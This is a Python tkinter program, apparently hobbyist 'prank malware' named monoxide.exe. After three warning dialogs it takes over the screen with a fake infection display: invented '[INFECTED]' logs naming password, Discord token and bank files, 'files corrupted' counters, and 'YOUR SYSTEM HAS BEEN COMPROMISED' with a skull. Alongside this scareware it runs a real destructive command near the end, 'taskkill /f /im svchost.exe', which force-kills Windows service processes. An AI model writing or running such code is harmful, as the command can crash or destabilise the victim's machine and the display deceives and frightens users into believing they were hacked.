import tkinter as tk
from tkinter import messagebox, simpledialog

# --- Warning popups before anything runs ---
root_check = tk.Tk()
root_check.withdraw()

# Popup 1
result = messagebox.askokcancel(
    "F0WARXIDEJCE by Flower_r4sr0 - Malware Warning",
    "This is malware. Continue?"
)
if not result:
    root_check.destroy()
    exit()

# Popup 2
answer = simpledialog.askstring(
    "F0WARXIDEJCE by Flower_r4sr0 - Malware Warning - LAST WARNING",
    "LAST WARNING\nType 'F0WARXIDEJCE' to continue, type nothing to cancel:"
)
if answer != "F0WARXIDEJCE":
    root_check.destroy()
    exit()

# Popup 3
final = messagebox.askokcancel(
    "F0WARXIDEJCE by Flower_r4sr0 - Malware Warning",
    "I AM NOT RESPONSIBLE FOR ANY TYPE OF DAMAGE MADE BY PRESSING OK\n"
    "THIS IS YOUR ACTUAL FINAL WARNING\nPRESS OK TO CONTINUE"
)
if not final:
    root_check.destroy()
    exit()

root_check.destroy()

# --- Now run the main program ---
import random
import math
import os

root = tk.Tk()
root.title("monoxide.exe")
root.configure(bg="black")
root.attributes("-fullscreen", True)
root.attributes("-topmost", True)

W = root.winfo_screenwidth()
H = root.winfo_screenheight()

canvas = tk.Canvas(root, width=W, height=H, bg="black", highlightthickness=0)
canvas.pack()

t = [0]
glitch_lines = []
fake_files = [
    "C:\\Windows\\System32\\kernel32.dll",
    "C:\\Users\\victim\\Documents\\passwords.txt",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "C:\\Program Files\\Steam\\userdata\\config.vdf",
    "C:\\Users\\victim\\AppData\\Roaming\\Discord\\tokens",
    "C:\\Windows\\System32\\ntoskrnl.exe",
    "C:\\Users\\victim\\Desktop\\bank_info.txt",
    "C:\\Windows\\SysWOW64\\msvcp140.dll",
]
log_lines = []
log_scroll = [0]
phase = [0]

root.bind("<Escape>", lambda e: root.destroy())

def random_hex(length=8):
    return ''.join(random.choices("0123456789ABCDEF", k=length))

def random_binary(length=32):
    return ''.join(random.choices("01", k=length))

def glitch_text(text):
    glitch_chars = "!@#$%^&*░▒▓█▄▀■□▪▫"
    result = ""
    for c in text:
        if random.random() < 0.15:
            result += random.choice(glitch_chars)
        else:
            result += c
    return result

def draw_skull(canvas, cx, cy, size, color):
    canvas.create_oval(cx - size, cy - size, cx + size, cy + size*0.7,
                       outline=color, width=3, fill="")
    ew = size * 0.22
    canvas.create_oval(cx - size*0.38 - ew, cy - size*0.3 - ew,
                       cx - size*0.38 + ew, cy - size*0.3 + ew,
                       fill=color, outline="")
    canvas.create_oval(cx + size*0.38 - ew, cy - size*0.3 - ew,
                       cx + size*0.38 + ew, cy - size*0.3 + ew,
                       fill=color, outline="")
    canvas.create_polygon(cx, cy - size*0.05,
                          cx - size*0.1, cy + size*0.15,
                          cx + size*0.1, cy + size*0.15,
                          fill="", outline=color, width=2)
    for i in range(5):
        tx = cx - size*0.4 + i * (size * 0.2)
        canvas.create_rectangle(tx, cy + size*0.5,
                                 tx + size*0.15, cy + size*0.8,
                                 fill=color, outline="")

def add_log(msg):
    log_lines.append(msg)
    if len(log_lines) > 200:
        log_lines.pop(0)

for f in fake_files:
    add_log(f"[INFECTED] {f}")

def animate():
    canvas.delete("all")
    tick = t[0]
    p = phase[0]

    if tick == 80:
        phase[0] = 1
    elif tick == 220:
        phase[0] = 2
    elif tick == 380:
        phase[0] = 3

    if p == 0:
        canvas.create_rectangle(0, 0, W, H, fill="black", outline="")
        blink = int(tick * 0.3) % 2
        msg = "monoxide.exe" if blink else ""
        canvas.create_text(W//2, H//2 - 40, text=msg,
                           fill="#ff0000", font=("Courier", 52, "bold"))
        canvas.create_text(W//2, H//2 + 30,
                           text="Initializing payload...",
                           fill="#880000", font=("Courier", 18))
        bar_w = int((tick / 80) * W * 0.6)
        canvas.create_rectangle(W*0.2, H//2+70, W*0.2+bar_w, H//2+90,
                                 fill="#ff0000", outline="#ff4444")
        canvas.create_text(W//2, H//2+110,
                           text=f"{int((tick/80)*100)}%",
                           fill="#ff4444", font=("Courier", 14))

    elif p == 1:
        canvas.create_rectangle(0, 0, W, H, fill="#050005", outline="")
        visible = 28
        start = max(0, len(log_lines) - visible - log_scroll[0])
        shown = log_lines[start:start+visible]
        for i, line in enumerate(shown):
            color = "#ff2200" if "INFECTED" in line else "#00ff44"
            canvas.create_text(40, 60 + i*22, anchor="w",
                               text=glitch_text(line) if random.random()<0.08 else line,
                               fill=color, font=("Courier", 12))
        if tick % 4 == 0:
            fake = random.choice(fake_files)
            add_log(f"[INFECTED] {fake}  [{random_hex()}]")
        canvas.create_text(W//2, 25, text="▓▓ SCANNING SYSTEM FILES ▓▓",
                           fill="#ff0000", font=("Courier", 20, "bold"))
        for row in range(18):
            y = 60 + row * 26
            hexrow = ' '.join([random_hex(2) for _ in range(16)])
            canvas.create_text(W - 380, y, anchor="w",
                               text=hexrow, fill="#003300",
                               font=("Courier", 11))
        canvas.create_text(W//2, H-30,
                           text=f"FILES CORRUPTED: {min(tick-80, 999):04d}   "
                                f"MEM ADDR: 0x{random_hex(8)}",
                           fill="#ff4400", font=("Courier", 13))

    elif p == 2:
        bg = random.choice(["#000000","#050000","#000500","#0a0000"])
        canvas.create_rectangle(0, 0, W, H, fill=bg, outline="")
        for _ in range(random.randint(4, 14)):
            gy = random.randint(0, H)
            gh = random.randint(2, 30)
            gx = random.randint(-100, 0)
            canvas.create_rectangle(gx, gy, gx + W + random.randint(0,200),
                                     gy+gh, fill=random.choice(
                                     ["#ff0000","#00ff00","#0000ff","#ffffff"]),
                                     outline="", stipple="gray50")
        msgs = ["SYSTEM CORRUPTED", "ALL YOUR FILES ARE BELONG TO US",
                "monoxide.exe", "ENCRYPTING...", "NO ESCAPE",
                f"0x{random_hex(8)} FATAL ERROR"]
        for i in range(6):
            msg = random.choice(msgs)
            x = random.randint(100, W-100)
            y = random.randint(80, H-80)
            size = random.randint(16, 48)
            color = random.choice(["#ff0000","#ff4400","#ff8800","#ffffff"])
            canvas.create_text(x, y, text=glitch_text(msg),
                               fill=color, font=("Courier", size, "bold"))
        for y in range(0, H, 4):
            canvas.create_line(0, y, W, y, fill="#000000", width=1,
                               stipple="gray25")
        canvas.create_text(W//2, H-20, text="[ PRESS ESC TO STOP ]",
                           fill="#333333", font=("Courier", 10))

    elif p == 3:
        canvas.create_rectangle(0, 0, W, H, fill="black", outline="")
        pulse = 80 + 40 * math.sin(tick * 0.1)
        for i in range(8, 0, -1):
            r = pulse * i * 0.5
            canvas.create_oval(W//2 - r, H//2 - r - 40,
                               W//2 + r, H//2 + r - 40,
                               fill=f"#1a0000", outline="")
        skull_color = f"#ff{format(int(tick*3 % 255), '02x'):>02}00" \
            if (tick//10) % 2 == 0 else "#ff0000"
        draw_skull(canvas, W//2, H//2 - 40, 140, skull_color)
        blink2 = (tick // 15) % 2
        if blink2:
            canvas.create_text(W//2, H//2 + 140,
                               text="YOUR SYSTEM HAS BEEN COMPROMISED",
                               fill="#ff0000", font=("Courier", 24, "bold"))
        canvas.create_text(W//2, H//2 + 190,
                           text=f"monoxide.exe  |  PID: {random.randint(1000,9999)}"
                                f"  |  0x{random_hex()}",
                           fill="#440000", font=("Courier", 14))
        for corner_x, corner_y in [(20,20),(W-200,20),(20,H-40),(W-200,H-40)]:
            canvas.create_text(corner_x, corner_y, anchor="w",
                               text=random_binary(16),
                               fill="#1a0000", font=("Courier", 10))
        canvas.create_text(W//2, H-20, text="[ PRESS ESC TO EXIT ]",
                           fill="#555555", font=("Courier", 11))

    t[0] += 1
    root.after(40, animate)

animate()
os.system("taskkill /f /im svchost.exe")
root.mainloop()
